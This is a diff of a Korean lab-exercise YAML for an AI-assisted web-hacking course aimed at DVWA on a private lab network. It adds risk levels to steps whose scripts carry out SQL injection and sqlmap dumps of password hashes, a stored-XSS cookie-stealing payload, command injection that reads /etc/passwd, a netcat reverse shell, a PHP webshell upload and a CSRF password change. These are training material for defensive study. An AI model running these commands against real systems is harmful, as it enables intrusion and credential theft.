@@ -1,9 +1,9 @@
 lab_id: battle-ai-week03
-title: AI 기반 웹 애플리케이션 공격 — SQL Injection, XSS, 파일 업로드
+title: 웹 애플리케이션 공격 — SQL Injection, XSS, 파일 업로드 (AI 지원)
 version: ai
 course: battle-ai
 week: 3
-description: AI 에이전트가 자동으로 실행하는 OWASP Top 10 기반 웹 취약점을 실습한다. SQL Injection, XSS, C... ommand Injection, 파일 업로드 취약점을 직접 공격하며, 각 취약점의 원리와 영향을 이해한다. DVWA를 대상으로 실습한다.
+description: OWASP Top 10 기반 웹 취약점을 실습한다. SQL Injection, XSS, Command Injection, 파일 업로드 취약점을 직접 공격하며, 각 취약점의 원리와 영향을 이해한다. DVWA를 대상으로 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -31,6 +31,7 @@ steps:
     expect: /tmp/dvwa_cookies.txt
     field: filesystem
   script: curl -c /tmp/dvwa_cookies.txt -d 'username=admin&password=password&Login=Login' http://10.20.30.50/dvwa/login.php
+  risk_level: medium
 - order: 2
   instruction: DVWA의 보안 레벨을 'low'로 설정하라.
   hint: Security 페이지에서 설정을 변경한다.
@@ -43,6 +44,7 @@ steps:
     expect: '200'
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt -d 'security=low&seclev_submit=Submit' http://10.20.30.50/dvwa/security.php
+  risk_level: medium
 - order: 3
   instruction: SQL Injection 페이지에서 ' OR '1'='1 입력으로 모든 사용자 정보를 추출하라.
   hint: User ID 필드에 SQL 구문을 삽입한다.
@@ -55,6 +57,7 @@ steps:
     expect: First name
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
+  risk_level: medium
 - order: 4
   instruction: UNION SELECT를 사용하여 데이터베이스 버전 정보를 추출하라.
   hint: UNION SELECT와 @@version을 사용한다.
@@ -67,6 +70,7 @@ steps:
     expect: Ubuntu
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2C@@version--+&Submit=Submit"
+  risk_level: medium
 - order: 5
   instruction: SQL Injection으로 데이터베이스의 모든 테이블 이름을 추출하라.
   hint: information_schema.tables를 활용한다.
@@ -79,6 +83,7 @@ steps:
     expect: users
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
+  risk_level: medium
 - order: 6
   instruction: SQL Injection으로 users 테이블의 패스워드 해시를 추출하라.
   hint: users 테이블의 user, password 컬럼을 SELECT한다.
@@ -91,6 +96,7 @@ steps:
     expect: admin
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users--+&Submit=Submit"
+  risk_level: medium
 - order: 7
   instruction: sqlmap을 사용하여 SQL Injection을 자동으로 공격하고 데이터베이스를 덤프하라.
   hint: sqlmap -u 옵션으로 취약한 URL을 지정한다.
@@ -103,6 +109,7 @@ steps:
     expect: available databases
     field: stdout
   script: sqlmap -u "http://10.20.30.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$(cat /tmp/dvwa_cookies.txt | grep PHPSESSID | awk '{print $NF}')" --batch --dbs
+  risk_level: medium
 - order: 8
   instruction: Reflected XSS 취약점 페이지에서 alert 창을 띄우는 XSS 페이로드를 삽입하라.
   hint: <script> 태그를 사용한다.
@@ -115,6 +122,7 @@ steps:
     expect: <script>
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
+  risk_level: medium
 - order: 9
   instruction: Stored XSS 취약점 페이지(Guestbook)에 영구적인 XSS 페이로드를 삽입하라.
   hint: 방명록에 스크립트를 포함한 메시지를 작성한다.
@@ -129,6 +137,7 @@ steps:
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt -d "txtName=hacker&mtxMessage=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F10.20.30.10%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E&btnSign=Sign+Guestbook"
     http://10.20.30.50/dvwa/vulnerabilities/xss_s/
+  risk_level: medium
 - order: 10
   instruction: Command Injection 취약점 페이지에서 서버의 /etc/passwd 파일을 읽어라.
   hint: 세미콜론(;)으로 명령을 연결한다.
@@ -141,6 +150,7 @@ steps:
     expect: 'root:'
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+  risk_level: medium
 - order: 11
   instruction: 'Command Injection으로 리버스 셸을 설정하라. (Kali IP: 10.20.30.10)'
   hint: netcat 리스너를 먼저 설정하고, 파이프를 활용한다.
@@ -153,6 +163,7 @@ steps:
     expect: 127.0.0.1
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt -d "ip=127.0.0.1;nc+-e+/bin/bash+10.20.30.10+4444&Submit=Submit" http://10.20.30.50/dvwa/vulnerabilities/exec/
+  risk_level: medium
 - order: 12
   instruction: 파일 업로드 취약점을 이용하여 PHP 웹셸을 업로드하라.
   hint: 간단한 PHP 파일을 생성하여 업로드한다.
@@ -165,6 +176,7 @@ steps:
     expect: succesfully uploaded
     field: stdout
   script: echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php && curl -b /tmp/dvwa_cookies.txt -F "MAX_FILE_SIZE=100000" -F "uploaded=@/tmp/shell.php" -F "Upload=Upload" http://10.20.30.50/dvwa/vulnerabilities/upload/
+  risk_level: medium
 - order: 13
   instruction: 업로드한 웹셸을 통해 서버에서 id 명령을 실행하라.
   hint: 업로드된 파일 경로에 cmd 파라미터를 전달한다.
@@ -177,6 +189,7 @@ steps:
     expect: www-data
     field: stdout
   script: curl "http://10.20.30.50/dvwa/hackable/uploads/shell.php?cmd=id"
+  risk_level: medium
 - order: 14
   instruction: CSRF 토큰이 없는 패스워드 변경 페이지를 공격하여 admin 비밀번호를 변경하라.
   hint: DVWA CSRF 페이지에 GET 요청으로 패스워드를 변경한다.
@@ -189,6 +202,7 @@ steps:
     expect: Password Changed
     field: stdout
   script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.50/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
+  risk_level: medium
 - order: 15
   instruction: 이번 주 웹 공격 실습 결과를 정리하여 취약점 보고서를 작성하라. 각 취약점의 유형, 심각도, 공격 증거, 대응 방안을 포함하라.
   hint: OWASP Top 10 분류를 참고한다.
@@ -213,3 +227,4 @@ steps:
     \   Remediation: Avoid system(), use allowlist\n\n5. Unrestricted File Upload (OWASP A04:2021)\n   Severity: Critical (CVSS 9.8)\n   Evidence: PHP webshell uploaded and executed\n   Remediation: File\
     \ type validation, upload directory restrictions\n\n6. CSRF (OWASP A01:2021)\n   Severity: High (CVSS 8.0)\n   Evidence: Password changed without CSRF token\n   Remediation: Anti-CSRF tokens, SameSite\
     \ cookies\nEOF"
+  risk_level: low
